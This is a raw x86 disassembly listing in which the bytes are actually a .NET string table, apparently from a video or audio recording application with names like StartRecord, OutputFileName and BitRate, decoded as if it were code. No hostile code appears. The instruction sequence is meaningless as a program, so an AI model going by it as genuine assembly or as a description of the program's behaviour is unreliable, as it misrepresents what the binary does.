  404a1b:	dec    esi
  404a1c:	popa   
  404a1d:	ins    DWORD PTR es:[edi],dx
  404a1e:	add    BYTE PTR gs:[ebx+0x65],dh
  404a22:	je     0x404a83
  404a24:	inc    ebx
  404a25:	push   0x656e6e61
  404a2a:	ins    BYTE PTR es:[edi],dx
  404a2b:	push   eax
  404a2c:	outs   dx,DWORD PTR ds:[esi]
  404a2d:	jb     0x404aa3
  404a2f:	dec    esi
  404a30:	popa   
  404a31:	ins    DWORD PTR es:[edi],dx
  404a32:	add    BYTE PTR gs:[edi+0x65],ah
  404a36:	je     0x404a97
  404a38:	push   edx
  404a39:	arpl   WORD PTR gs:[edi+0x72],bp
  404a3d:	fs gs jb 0x404a86
  404a41:	jbe    0x404aa8
  404a43:	outs   dx,BYTE PTR ds:[esi]
  404a44:	je     0x404a94
  404a46:	popa   
  404a47:	ins    DWORD PTR es:[edi],dx
  404a48:	add    BYTE PTR gs:[ebx+0x65],dh
  404a4c:	je     0x404aad
  404a4e:	push   edx
  404a4f:	arpl   WORD PTR gs:[edi+0x72],bp
  404a53:	fs gs jb 0x404a9c
  404a57:	jbe    0x404abe
  404a59:	outs   dx,BYTE PTR ds:[esi]
  404a5a:	je     0x404aaa
  404a5c:	popa   
  404a5d:	ins    DWORD PTR es:[edi],dx
  404a5e:	add    BYTE PTR gs:[edi+0x65],ah
  404a62:	je     0x404ac3
  404a64:	push   edx
  404a65:	arpl   WORD PTR gs:[edi+0x72],bp
  404a69:	fs push esi
  404a6b:	imul   esp,DWORD PTR [ebp+eiz*2+0x6f],0x74657300
  404a73:	pop    edi
  404a74:	push   edx
  404a75:	arpl   WORD PTR gs:[edi+0x72],bp
  404a79:	fs push esi
  404a7b:	imul   esp,DWORD PTR [ebp+eiz*2+0x6f],0x74656700
  404a83:	pop    edi
  404a84:	push   edx
  404a85:	arpl   WORD PTR gs:[edi+0x72],bp
  404a89:	fs inc ecx
  404a8b:	jne    0x404af1
  404a8d:	imul   ebp,DWORD PTR [edi+0x0],0x5f746573
  404a94:	push   edx
  404a95:	arpl   WORD PTR gs:[edi+0x72],bp
  404a99:	fs inc ecx
  404a9b:	jne    0x404b01
  404a9d:	imul   ebp,DWORD PTR [edi+0x0],0x5f746567
  404aa4:	dec    edi
  404aa5:	jne    0x404b1b
  404aa7:	jo     0x404b1e
  404aa9:	je     0x404af1
  404aab:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x656d61
  404ab3:	jae    0x404b1a
  404ab5:	je     0x404b16
  404ab7:	dec    edi
  404ab8:	jne    0x404b2e
  404aba:	jo     0x404b31
  404abc:	je     0x404b04
  404abe:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x656d61
  404ac6:	addr16 gs je 0x404b29
  404aca:	inc    edx
  404acb:	imul   esi,DWORD PTR [edx+edx*2+0x61],0x73006574
  404ad3:	gs je  0x404b35
  404ad6:	inc    edx
  404ad7:	imul   esi,DWORD PTR [edx+edx*2+0x61],0x67006574
  404adf:	gs je  0x404b41
  404ae2:	inc    esi
  404ae3:	jb     0x404b46
  404ae5:	ins    DWORD PTR es:[edi],dx
  404ae6:	gs push edx
  404ae8:	popa   
  404ae9:	je     0x404b50
  404aeb:	add    BYTE PTR [ebx+0x65],dh
  404aee:	je     0x404b4f
  404af0:	inc    esi
  404af1:	jb     0x404b54
  404af3:	ins    DWORD PTR es:[edi],dx
  404af4:	gs push edx
  404af6:	popa   
  404af7:	je     0x404b5e
  404af9:	add    BYTE PTR [edi+0x65],ah
  404afc:	je     0x404b5d
  404afe:	inc    esp
  404aff:	jne    0x404b73
  404b01:	popa   
  404b02:	je     0x404b6d
  404b04:	outs   dx,DWORD PTR ds:[esi]
  404b05:	outs   dx,BYTE PTR ds:[esi]
  404b06:	add    BYTE PTR [ebx+0x65],dh
  404b09:	je     0x404b6a
  404b0b:	inc    esp
  404b0c:	jne    0x404b80
  404b0e:	popa   
  404b0f:	je     0x404b7a
  404b11:	outs   dx,DWORD PTR ds:[esi]
  404b12:	outs   dx,BYTE PTR ds:[esi]
  404b13:	add    BYTE PTR [eax+0x61],dl
  404b16:	jb     0x404b8b
  404b18:	add    BYTE PTR gs:[esi+0x6f],al
  404b1c:	jb     0x404b8b
  404b1e:	popa   
  404b1f:	je     0x404b21
  404b21:	inc    edi
  404b22:	gs je  0x404b68
  404b25:	outs   dx,DWORD PTR ds:[esi]
  404b26:	outs   dx,BYTE PTR ds:[esi]
  404b27:	imul   sp,WORD PTR [edi+0x53],0x7465
  404b2d:	je     0x404b98
  404b2f:	outs   dx,BYTE PTR ds:[esi]
  404b30:	addr16 jae 0x404b33
  404b33:	push   ebx
  404b34:	jns    0x404ba9
  404b36:	je     0x404b9d
  404b38:	ins    DWORD PTR es:[edi],dx
  404b39:	cs inc ebx
  404b3b:	outs   dx,DWORD PTR ds:[esi]
  404b3c:	ins    BYTE PTR es:[edi],dx
  404b3d:	ins    BYTE PTR es:[edi],dx
  404b3e:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  404b43:	outs   dx,BYTE PTR ds:[esi]
  404b44:	jae    0x404b74
  404b46:	inc    edi
  404b47:	outs   dx,BYTE PTR gs:[esi]
  404b49:	gs jb  0x404bb5
  404b4c:	arpl   WORD PTR [eax],ax
  404b4e:	dec    esp
  404b4f:	imul   esi,DWORD PTR [ebx+0x74],0x53003160
  404b56:	gs je  0x404ba9
  404b59:	popa   
  404b5a:	jb     0x404bbd
  404b5c:	ins    DWORD PTR es:[edi],dx
  404b5d:	gs je  0x404bc5
  404b60:	jb     0x404bb8
  404b62:	popa   
  404b63:	ins    BYTE PTR es:[edi],dx
  404b64:	jne    0x404bcb
  404b66:	add    BYTE PTR [ebx+0x65],dl
  404b69:	je     0x404bbb
  404b6b:	jb     0x404bdc
  404b6d:	jo     0x404bd4
  404b6f:	jb     0x404be5
  404b71:	jns    0x404bc9
  404b73:	popa   
  404b74:	ins    BYTE PTR es:[edi],dx
  404b75:	jne    0x404bdc
  404b77:	add    BYTE PTR [edi+ebp*2+0x67],cl
  404b7b:	dec    ebp
  404b7c:	gs jae 0x404bf2
  404b7f:	popa   
  404b80:	addr16 gs jae 0x404b84
  404b84:	cmp    al,0x53
  404b86:	je     0x404be9
  404b88:	outs   dx,BYTE PTR ds:[esi]
  404b89:	fs inc ecx
  404b8b:	ins    BYTE PTR es:[edi],dx
  404b8c:	outs   dx,DWORD PTR ds:[esi]
  404b8d:	outs   dx,BYTE PTR ds:[esi]
  404b8e:	gs dec ebp
  404b90:	outs   dx,DWORD PTR ds:[esi]
  404b91:	fs gs imul ebx,DWORD PTR ds:[edi+0x5f],0x42
  404b98:	popa   
  404b99:	arpl   WORD PTR [ebx+0x69],bp
  404b9c:	outs   dx,BYTE PTR ds:[esi]
  404b9d:	addr16 inc esi
  404b9f:	imul   esp,DWORD PTR [ebp+0x6c],0x503c0064
  404ba6:	popa   
  404ba7:	jb     0x404c0e
  404ba9:	outs   dx,BYTE PTR ds:[esi]
  404baa:	je     0x404bfc
  404bac:	jb     0x404c1d
  404bae:	arpl   WORD PTR [ebp+0x73],sp
  404bb1:	jae    0x404bf1
  404bb3:	imul   ebx,DWORD PTR [edi+0x5f],0x42
  404bb7:	popa   
  404bb8:	arpl   WORD PTR [ebx+0x69],bp
  404bbb:	outs   dx,BYTE PTR ds:[esi]
  404bbc:	addr16 inc esi
  404bbe:	imul   esp,DWORD PTR [ebp+0x6c],0x433c0064
  404bc5:	push   0x656e6e61
  404bca:	ins    BYTE PTR es:[edi],dx
  404bcb:	push   eax
  404bcc:	outs   dx,DWORD PTR ds:[esi]
  404bcd:	jb     0x404c43
  404bcf:	dec    esi
  404bd0:	popa   
  404bd1:	ins    DWORD PTR es:[edi],dx
  404bd2:	gs imul ebx,DWORD PTR ds:[edi+0x5f],0x42
  404bd8:	popa   
  404bd9:	arpl   WORD PTR [ebx+0x69],bp
  404bdc:	outs   dx,BYTE PTR ds:[esi]
  404bdd:	addr16 inc esi
  404bdf:	imul   esp,DWORD PTR [ebp+0x6c],0x523c0064
  404be6:	arpl   WORD PTR gs:[edi+0x72],bp
  404bea:	fs gs jb 0x404c33
  404bee:	jbe    0x404c55
  404bf0:	outs   dx,BYTE PTR ds:[esi]
  404bf1:	je     0x404c41
  404bf3:	popa   
  404bf4:	ins    DWORD PTR es:[edi],dx
  404bf5:	gs imul ebx,DWORD PTR ds:[edi+0x5f],0x42
  404bfb:	popa   
  404bfc:	arpl   WORD PTR [ebx+0x69],bp
  404bff:	outs   dx,BYTE PTR ds:[esi]
  404c00:	addr16 inc esi
  404c02:	imul   esp,DWORD PTR [ebp+0x6c],0x523c0064
  404c09:	arpl   WORD PTR gs:[edi+0x72],bp
  404c0d:	fs push esi
  404c0f:	imul   esp,DWORD PTR [ebp+eiz*2+0x6f],0x5f5f6b3e
  404c17:	inc    edx
  404c18:	popa   
  404c19:	arpl   WORD PTR [ebx+0x69],bp
  404c1c:	outs   dx,BYTE PTR ds:[esi]
  404c1d:	addr16 inc esi
  404c1f:	imul   esp,DWORD PTR [ebp+0x6c],0x523c0064
  404c26:	arpl   WORD PTR gs:[edi+0x72],bp
  404c2a:	fs inc ecx
  404c2c:	jne    0x404c92
  404c2e:	imul   ebp,DWORD PTR [edi+0x3e],0x425f5f6b
  404c35:	popa   
  404c36:	arpl   WORD PTR [ebx+0x69],bp
  404c39:	outs   dx,BYTE PTR ds:[esi]
  404c3a:	addr16 inc esi
  404c3c:	imul   esp,DWORD PTR [ebp+0x6c],0x4f3c0064
  404c43:	jne    0x404cb9
  404c45:	jo     0x404cbc
  404c47:	je     0x404c8f
  404c49:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x3e656d61
  404c51:	imul   ebx,DWORD PTR [edi+0x5f],0x42
  404c55:	popa   
  404c56:	arpl   WORD PTR [ebx+0x69],bp
  404c59:	outs   dx,BYTE PTR ds:[esi]
  404c5a:	addr16 inc esi
  404c5c:	imul   esp,DWORD PTR [ebp+0x6c],0x423c0064
  404c63:	imul   esi,DWORD PTR [edx+edx*2+0x61],0x6b3e6574
  404c6b:	pop    edi
  404c6c:	pop    edi
  404c6d:	inc    edx
  404c6e:	popa   
  404c6f:	arpl   WORD PTR [ebx+0x69],bp
  404c72:	outs   dx,BYTE PTR ds:[esi]
  404c73:	addr16 inc esi
  404c75:	imul   esp,DWORD PTR [ebp+0x6c],0x463c0064
  404c7c:	jb     0x404cdf
  404c7e:	ins    DWORD PTR es:[edi],dx
  404c7f:	gs push edx
  404c81:	popa   
  404c82:	je     0x404ce9
  404c84:	imul   ebx,DWORD PTR ds:[edi+0x5f],0x42
  404c89:	popa   
  404c8a:	arpl   WORD PTR [ebx+0x69],bp
  404c8d:	outs   dx,BYTE PTR ds:[esi]
  404c8e:	addr16 inc esi
  404c90:	imul   esp,DWORD PTR [ebp+0x6c],0x443c0064
  404c97:	jne    0x404d0b
  404c99:	popa   
  404c9a:	je     0x404d05
  404c9c:	outs   dx,DWORD PTR ds:[esi]
  404c9d:	outs   dx,BYTE PTR ds:[esi]
  404c9e:	imul   ebx,DWORD PTR ds:[edi+0x5f],0x42
  404ca3:	popa   
  404ca4:	arpl   WORD PTR [ebx+0x69],bp
  404ca7:	outs   dx,BYTE PTR ds:[esi]
  404ca8:	addr16 inc esi
  404caa:	imul   esp,DWORD PTR [ebp+0x6c],0x74530064
  404cb1:	popa   
  404cb2:	outs   dx,BYTE PTR ds:[esi]
  404cb3:	fs inc ecx
  404cb5:	ins    BYTE PTR es:[edi],dx
  404cb6:	outs   dx,DWORD PTR ds:[esi]
  404cb7:	outs   dx,BYTE PTR ds:[esi]
  404cb8:	gs dec ebp
  404cba:	outs   dx,DWORD PTR ds:[esi]
  404cbb:	fs add BYTE PTR gs:[eax+0x61],dl
  404cc0:	jb     0x404d27
  404cc2:	outs   dx,BYTE PTR ds:[esi]
  404cc3:	je     0x404d15
  404cc5:	jb     0x404d36
  404cc7:	arpl   WORD PTR [ebp+0x73],sp
  404cca:	jae    0x404ccc
  404ccc:	inc    ebx
  404ccd:	push   0x656e6e61
  404cd2:	ins    BYTE PTR es:[edi],dx
  404cd3:	push   eax
  404cd4:	outs   dx,DWORD PTR ds:[esi]
  404cd5:	jb     0x404d4b
  404cd7:	dec    esi
  404cd8:	popa   
  404cd9:	ins    DWORD PTR es:[edi],dx
  404cda:	add    BYTE PTR gs:[edx+0x65],dl
  404cde:	arpl   WORD PTR [edi+0x72],bp
  404ce1:	fs gs jb 0x404d2a
  404ce5:	jbe    0x404d4c
  404ce7:	outs   dx,BYTE PTR ds:[esi]
  404ce8:	je     0x404d38
  404cea:	popa   
  404ceb:	ins    DWORD PTR es:[edi],dx
  404cec:	add    BYTE PTR gs:[edx+0x65],dl
  404cf0:	arpl   WORD PTR [edi+0x72],bp
  404cf3:	fs push esi
  404cf5:	imul   esp,DWORD PTR [ebp+eiz*2+0x6f],0x63655200
  404cfd:	outs   dx,DWORD PTR ds:[esi]
  404cfe:	jb     0x404d64
  404d00:	inc    ecx
  404d01:	jne    0x404d67
  404d03:	imul   ebp,DWORD PTR [edi+0x0],0x7074754f
  404d0a:	jne    0x404d80
  404d0c:	inc    esi
  404d0d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x656d61
  404d15:	inc    edx
  404d16:	imul   esi,DWORD PTR [edx+edx*2+0x61],0x46006574
  404d1e:	jb     0x404d81
  404d20:	ins    DWORD PTR es:[edi],dx
  404d21:	gs push edx
  404d23:	popa   
  404d24:	je     0x404d8b
  404d26:	add    BYTE PTR [ebp+esi*2+0x72],al
  404d2a:	popa   
  404d2b:	je     0x404d96
  404d2d:	outs   dx,DWORD PTR ds:[esi]
  404d2e:	outs   dx,BYTE PTR ds:[esi]
  404d2f:	add    BYTE PTR [ecx+0x63],al
  404d32:	je     0x404d9d
  404d34:	outs   dx,DWORD PTR ds:[esi]
  404d35:	outs   dx,BYTE PTR ds:[esi]
  404d36:	pusha  
  404d37:	xor    DWORD PTR [eax],eax
  404d39:	push   ebx
  404d3a:	je     0x404d9d
  404d3c:	jb     0x404db2
  404d3e:	push   esi
  404d3f:	imul   esp,DWORD PTR [ebp+eiz*2+0x6f],0x6f636552
  404d47:	jb     0x404dad
  404d49:	gs jb  0x404d4c
  404d4c:	push   ebx
  404d4d:	je     0x404dbe
  404d4f:	jo     0x404da7
  404d51:	imul   esp,DWORD PTR [ebp+eiz*2+0x6f],0x6f636552
  404d59:	jb     0x404dbf
  404d5b:	gs jb  0x404d5e
  404d5e:	push   eax
  404d5f:	popa   
  404d60:	jne    0x404dd5
  404d62:	gs push esi
  404d64:	imul   esp,DWORD PTR [ebp+eiz*2+0x6f],0x6f636552
  404d6c:	jb     0x404dd2
  404d6e:	gs jb  0x404d71
  404d71:	push   edx
  404d72:	gs jae 0x404dea
  404d75:	ins    DWORD PTR es:[edi],dx
  404d76:	gs push esi
  404d78:	imul   esp,DWORD PTR [ebp+eiz*2+0x6f],0x6f636552
  404d80:	jb     0x404de6
  404d82:	gs jb  0x404d85
  404d85:	inc    edi
  404d86:	gs je  0x404dcd
  404d89:	gs popaw 
  404d8c:	jne    0x404dfa
  404d8e:	je     0x404dd1
  404d90:	jne    0x404df6
  404d92:	imul   ebp,DWORD PTR [edi+0x44],0x63697665
  404d99:	gs dec esi
  404d9b:	popa   
  404d9c:	ins    DWORD PTR es:[edi],dx
  404d9d:	add    BYTE PTR gs:[edi+0x65],al
  404da1:	je     0x404de8
  404da3:	jb     0x404e17
  404da5:	outs   dx,DWORD PTR ds:[esi]
  404da6:	jb     0x404da8
  404da8:	inc    esp
  404da9:	imul   esi,DWORD PTR [ebx+0x70],0x5465736f
  404db0:	imul   ebp,DWORD PTR [ebp+0x65],0x68540072
  404db7:	jb     0x404e28
  404db9:	ja     0x404e04
  404dbb:	inc    si
  404dbd:	popa   
  404dbe:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x6d695400
  404dc6:	gs jb  0x404dc9
  404dc9:	gs jb  0x404e3e
  404dcc:	outs   dx,DWORD PTR ds:[esi]
  404dcd:	jb     0x404e12
  404dcf:	push   0x546b6365
  404dd4:	imul   ebp,DWORD PTR [ebp+0x65],0x69740072
  404ddb:	ins    DWORD PTR es:[edi],dx
  404ddc:	gs jb  0x404e2b
  404ddf:	outs   dx,DWORD PTR ds:[esi]
  404de0:	arpl   WORD PTR [ebx+0x0],bp
  404de3:	fs ins BYTE PTR es:[edi],dx
  404de5:	ins    BYTE PTR es:[edi],dx
  404de6:	dec    esi
  404de7:	popa   
  404de8:	ins    DWORD PTR es:[edi],dx
  404de9:	add    BYTE PTR gs:[ebx+0x79],dl
  404ded:	jae    0x404e63
  404def:	gs ins DWORD PTR es:[edi],dx
  404df1:	cs push edx
  404df3:	gs jae 0x404e65
  404df6:	jne    0x404e6a
  404df8:	arpl   WORD PTR [ebp+0x73],sp
  404dfb:	add    BYTE PTR [edx+0x65],dl
  404dfe:	jae    0x404e6f
  404e00:	jne    0x404e74
  404e02:	arpl   WORD PTR [ebp+0x4d],sp
  404e05:	popa   
  404e06:	outs   dx,BYTE PTR ds:[esi]
  404e07:	popa   
  404e08:	addr16 gs jb 0x404e0c
  404e0c:	jb     0x404e73
  404e0e:	jae    0x404e7f
  404e10:	jne    0x404e84
  404e12:	arpl   WORD PTR [ebp+0x4d],sp
  404e15:	popa   
  404e16:	outs   dx,BYTE PTR ds:[esi]
  404e17:	add    BYTE PTR [ebx+0x79],dl
  404e1a:	jae    0x404e90
  404e1c:	gs ins DWORD PTR es:[edi],dx
  404e1e:	cs inc edi
  404e20:	ins    BYTE PTR es:[edi],dx
  404e21:	outs   dx,DWORD PTR ds:[esi]
  404e22:	bound  esp,QWORD PTR [ecx+0x6c]
  404e25:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  404e2c:	add    BYTE PTR [ebx+0x75],al
  404e2f:	ins    BYTE PTR es:[edi],dx
  404e30:	je     0x404ea7
  404e32:	jb     0x404e99
  404e34:	dec    ecx
  404e35:	outs   dx,BYTE PTR ds:[esi]
  404e36:	outs   dx,WORD PTR ds:[esi]
  404e38:	add    BYTE PTR [edx+0x65],dh
  404e3b:	jae    0x404eac
  404e3d:	jne    0x404eb1
  404e3f:	arpl   WORD PTR [ebp+0x43],sp
  404e42:	jne    0x404eb0
  404e44:	je     0x404ebb
  404e46:	jb     0x404ead
  404e48:	add    BYTE PTR [edi+0x65],ah
  404e4b:	je     0x404eac
  404e4d:	push   edx
  404e4e:	gs jae 0x404ec0
  404e51:	jne    0x404ec5
  404e53:	arpl   WORD PTR [ebp+0x4d],sp
  404e56:	popa   
  404e57:	outs   dx,BYTE PTR ds:[esi]
  404e58:	popa   
  404e59:	addr16 gs jb 0x404e5d
  404e5d:	addr16 gs je 0x404ec0
  404e61:	inc    ebx
  404e62:	jne    0x404ed0
  404e64:	je     0x404edb
  404e66:	jb     0x404ecd
  404e68:	add    BYTE PTR [ebx+0x65],dh
  404e6b:	je     0x404ecc
  404e6d:	inc    ebx
  404e6e:	jne    0x404edc
  404e70:	je     0x404ee7
  404e72:	jb     0x404ed9
  404e74:	add    BYTE PTR [edi+0x65],ah
  404e77:	je     0x404ed8
  404e79:	inc    ecx
  404e7a:	jne    0x404ee0
  404e7c:	imul   ebp,DWORD PTR [edi+0x44],0x63697665
  404e83:	gs inc ebp
  404e85:	jb     0x404ef9
  404e87:	outs   dx,DWORD PTR ds:[esi]
  404e88:	jb     0x404e8a
  404e8a:	addr16 gs je 0x404eed
  404e8e:	inc    ebx
  404e8f:	outs   dx,DWORD PTR ds:[esi]
  404e90:	jo     0x404f0b
  404e92:	jb     0x404efd
  404e94:	addr16 push 0x72745374
  404e9a:	imul   ebp,DWORD PTR [esi+0x67],0x74656700
  404ea1:	pop    edi
  404ea2:	push   eax
  404ea3:	popa   
  404ea4:	jne    0x404f19
  404ea6:	gs inc ebp
  404ea8:	jb     0x404f1c
  404eaa:	outs   dx,DWORD PTR ds:[esi]
  404eab:	jb     0x404ead
  404ead:	addr16 gs je 0x404f10
  404eb1:	push   edx
  404eb2:	gs jae 0x404f2a
  404eb5:	ins    DWORD PTR es:[edi],dx
  404eb6:	gs inc ebp
  404eb8:	jb     0x404f2c
  404eba:	outs   dx,DWORD PTR ds:[esi]
  404ebb:	jb     0x404ebd
  404ebd:	addr16 gs je 0x404f20
  404ec1:	push   ebx
  404ec2:	je     0x404f25
  404ec4:	jb     0x404f3a
  404ec6:	inc    ebp
  404ec7:	jb     0x404f3b
  404ec9:	outs   dx,DWORD PTR ds:[esi]
  404eca:	jb     0x404ecc
  404ecc:	addr16 gs je 0x404f2f
  404ed0:	push   ebx
  404ed1:	je     0x404f42
  404ed3:	jo     0x404f1a
  404ed5:	jb     0x404f49
  404ed7:	outs   dx,DWORD PTR ds:[esi]
  404ed8:	jb     0x404eda
  404eda:	addr16 gs je 0x404f3d
  404ede:	push   ebp
  404edf:	jae    0x404f42
  404ee1:	addr16 gs push ebx
  404ee4:	je     0x404f58
  404ee6:	imul   ebp,DWORD PTR [esi+0x67],0x6c754300
  404eed:	je     0x404f64
  404eef:	jb     0x404f56
  404ef1:	add    BYTE PTR [ecx+0x75],al
  404ef4:	imul   ebp,DWORD PTR fs:[edi+0x44],0x63697665
  404efc:	gs inc ebp
  404efe:	jb     0x404f72
  404f00:	outs   dx,DWORD PTR ds:[esi]
  404f01:	jb     0x404f03
  404f03:	inc    ebx
  404f04:	outs   dx,DWORD PTR ds:[esi]
  404f05:	jo     0x404f80
  404f07:	jb     0x404f72
  404f09:	addr16 push 0x72745374
  404f0f:	imul   ebp,DWORD PTR [esi+0x67],0x75615000
  404f16:	jae    0x404f7d
  404f18:	inc    ebp
  404f19:	jb     0x404f8d
  404f1b:	outs   dx,DWORD PTR ds:[esi]
  404f1c:	jb     0x404f1e
  404f1e:	push   edx
  404f1f:	gs jae 0x404f97
  404f22:	ins    DWORD PTR es:[edi],dx
  404f23:	gs inc ebp
  404f25:	jb     0x404f99
  404f27:	outs   dx,DWORD PTR ds:[esi]
  404f28:	jb     0x404f2a
  404f2a:	push   ebx
  404f2b:	je     0x404f8e
  404f2d:	jb     0x404fa3
  404f2f:	inc    ebp
  404f30:	jb     0x404fa4
  404f32:	outs   dx,DWORD PTR ds:[esi]
  404f33:	jb     0x404f35
  404f35:	push   ebx
  404f36:	je     0x404fa7
  404f38:	jo     0x404f7f
  404f3a:	jb     0x404fae
  404f3c:	outs   dx,DWORD PTR ds:[esi]
  404f3d:	jb     0x404f3f
  404f3f:	push   ebp
  404f40:	jae    0x404fa3
  404f42:	addr16 gs push ebx
  404f45:	je     0x404fb9
  404f47:	imul   ebp,DWORD PTR [esi+0x67],0x74696200
  404f4e:	push   edx
  404f4f:	popa   
  404f50:	je     0x404fb7
  404f52:	add    BYTE PTR [esi+0x72],ah
  404f55:	popa   
  404f56:	ins    DWORD PTR es:[edi],dx
  404f57:	gs push edx
  404f59:	popa   
  404f5a:	je     0x404fc1
  404f5c:	add    BYTE PTR [edx+0x65],dh
  404f5f:	arpl   WORD PTR [edi+0x72],bp
  404f62:	fs inc ecx
  404f64:	jne    0x404fca
  404f66:	imul   ebp,DWORD PTR [edi+0x0],0x6f636572
  404f6d:	jb     0x404fd3
  404f6f:	push   esi
  404f70:	imul   esp,DWORD PTR [ebp+eiz*2+0x6f],0x74756f00
  404f78:	jo     0x404fef
  404f7a:	je     0x404fc2
  404f7c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x656d61
  404f84:	arpl   WORD PTR [eax+0x61],bp
  404f87:	outs   dx,BYTE PTR ds:[esi]
  404f88:	outs   dx,BYTE PTR ds:[esi]
  404f89:	gs ins BYTE PTR es:[edi],dx
  404f8b:	dec    esi
  404f8c:	popa   
  404f8d:	ins    DWORD PTR es:[edi],dx
  404f8e:	add    BYTE PTR gs:[edx+0x65],dh
  404f92:	arpl   WORD PTR [edi+0x72],bp
  404f95:	fs gs jb 0x404f99
  404f99:	push   0x75736572
  404f9e:	ins    BYTE PTR es:[edi],dx
  404f9f:	je     0x404fa1
  404fa1:	popa   
  404fa2:	jb     0x40500b
  404fa4:	jae    0x404fa6
  404fa6:	jae    0x40500d
  404fa8:	outs   dx,BYTE PTR ds:[esi]
  404fa9:	fs gs jb 0x404fad
  404fad:	gs jbe 0x405015
  404fb0:	outs   dx,BYTE PTR ds:[esi]
  404fb1:	je     0x404ff4
  404fb3:	jb     0x40501c
  404fb5:	jae    0x404fb7
  404fb7:	jo     0x40501a
  404fb9:	jb     0x40501c
  404fbb:	ins    DWORD PTR es:[edi],dx
  404fbc:	gs je  0x405024
  404fbf:	jb     0x405034
  404fc1:	add    BYTE PTR [esi+0x61],dh
  404fc4:	ins    BYTE PTR es:[edi],dx
  404fc5:	jne    0x40502c
  404fc7:	add    BYTE PTR [ebp+0x65],ch
  404fca:	jae    0x40503f
  404fcc:	popa   
  404fcd:	add    BYTE PTR gs:[bx+si+0x61],dl
  404fd2:	jb     0x405035
  404fd4:	ins    DWORD PTR es:[edi],dx
  404fd5:	inc    ecx
  404fd6:	jb     0x40504a
  404fd8:	popa   
  404fd9:	jns    0x40501c
  404fdb:	je     0x405051
  404fdd:	jb     0x405048
  404fdf:	bound  esi,QWORD PTR [ebp+0x74]
  404fe2:	add    BYTE PTR gs:[eax+0x72],dh
  404fe6:	outs   dx,DWORD PTR ds:[esi]
  404fe7:	jo     0x40504e
  404fe9:	jb     0x40505f
  404feb:	jns    0x404fed
  404fed:	ins    BYTE PTR es:[edi],dx
  404fee:	outs   dx,DWORD PTR ds:[esi]
  404fef:	addr16 dec ecx
  404ff1:	outs   dx,BYTE PTR ds:[esi]
  404ff2:	outs   dx,WORD PTR ds:[esi]
  404ff4:	add    BYTE PTR [ebx+0x61],ah
  404ff7:	ins    BYTE PTR es:[edi],dx
  404ff8:	ins    BYTE PTR es:[edi],dx
  404ff9:	bound  esp,QWORD PTR [ecx+0x63]
  404ffc:	imul   eax,DWORD PTR [eax],0x64
  404fff:	gs jbe 0x40506b
  405002:	arpl   WORD PTR [ebp+0x4e],sp
  405005:	popa   
  405006:	ins    DWORD PTR es:[edi],dx
  405007:	add    BYTE PTR gs:[ebx+0x79],dl
  40500b:	jae    0x405081
  40500d:	gs ins DWORD PTR es:[edi],dx
  40500f:	cs push edx
  405011:	jne    0x405081
  405013:	je     0x40507e
  405015:	ins    DWORD PTR es:[edi],dx
  405016:	gs cs dec ecx
  405019:	outs   dx,BYTE PTR ds:[esi]
  40501a:	je     0x405081
  40501c:	jb     0x40508d
  40501e:	jo     0x405073
  405020:	gs jb  0x405099
  405023:	imul   esp,DWORD PTR [ebx+0x65],0x754f0073
  40502a:	je     0x40506d
  40502c:	je     0x4050a2
  40502e:	jb     0x405099
  405030:	bound  esi,QWORD PTR [ebp+0x74]
  405033:	add    BYTE PTR gs:[edi+0x62],ch
  405037:	push   0x0
  405039:	gs jb  0x4050ae
  40503c:	outs   dx,DWORD PTR ds:[esi]
  40503d:	jb     0x405082
  40503f:	outs   dx,DWORD PTR ds:[esi]
  405040:	fs add BYTE PTR gs:[ebp+0x72],ah
  405045:	jb     0x4050b6
  405047:	jb     0x40508f
  405049:	outs   dx,DWORD PTR ds:[esi]
  40504a:	jb     0x4050b9
  40504c:	popa   
  40504d:	je     0x40504f
  40504f:	dec    ebp
  405050:	popa   
  405051:	jb     0x4050c6
  405053:	push   0x73416c61
  405058:	inc    ecx
  405059:	je     0x4050cf
  40505b:	jb     0x4050c6
  40505d:	bound  esi,QWORD PTR [ebp+0x74]
  405060:	add    BYTE PTR gs:[ebp+0x6e],dl
  405064:	ins    DWORD PTR es:[edi],dx
  405065:	popa   
  405066:	outs   dx,BYTE PTR ds:[esi]
  405067:	popa   
  405068:	addr16 gs fs push esp
  40506c:	jns    0x4050de
  40506e:	add    BYTE PTR gs:[ecx+0x6e],cl
  405072:	inc    ecx
  405073:	je     0x4050e9
  405075:	jb     0x4050e0
  405077:	bound  esi,QWORD PTR [ebp+0x74]
  40507a:	add    BYTE PTR gs:[ebx+0x79],dl
  40507e:	jae    0x4050f4
  405080:	gs ins DWORD PTR es:[edi],dx
  405082:	cs push edx
  405084:	jne    0x4050f4
  405086:	je     0x4050f1
  405088:	ins    DWORD PTR es:[edi],dx
  405089:	gs cs push esi
  40508c:	gs jb  0x405102
  40508f:	imul   ebp,DWORD PTR [edi+0x6e],0x676e69
  405096:	push   esp
  405097:	popa   
  405098:	jb     0x405101
  40509a:	gs je  0x4050e3
  40509d:	jb     0x405100
  40509f:	ins    DWORD PTR es:[edi],dx
  4050a0:	gs ja  0x405112
  4050a3:	jb     0x405110
  4050a5:	inc    ecx
  4050a6:	je     0x40511c
  4050a8:	jb     0x405113
  4050aa:	bound  esi,QWORD PTR [ebp+0x74]
  4050ad:	add    BYTE PTR gs:[ebx+0x6f],al
  4050b1:	ins    DWORD PTR es:[edi],dx
  4050b2:	push   esi
  4050b3:	imul   esi,DWORD PTR [ebx+0x69],0x41656c62
  4050ba:	je     0x405130
  4050bc:	jb     0x405127
  4050be:	bound  esi,QWORD PTR [ebp+0x74]
  4050c1:	add    BYTE PTR gs:[ebx+0x4c],al
  4050c5:	push   ebx
  4050c6:	inc    ebx
  4050c7:	outs   dx,DWORD PTR ds:[esi]
  4050c8:	ins    DWORD PTR es:[edi],dx
  4050c9:	jo     0x405137
  4050cb:	imul   esp,DWORD PTR [ecx+0x6e],0x74744174
  4050d2:	jb     0x40513d
  4050d4:	bound  esi,QWORD PTR [ebp+0x74]
  4050d7:	add    BYTE PTR gs:[ebx+0x79],dl
  4050db:	jae    0x405151
  4050dd:	gs ins DWORD PTR es:[edi],dx
  4050df:	cs push edx
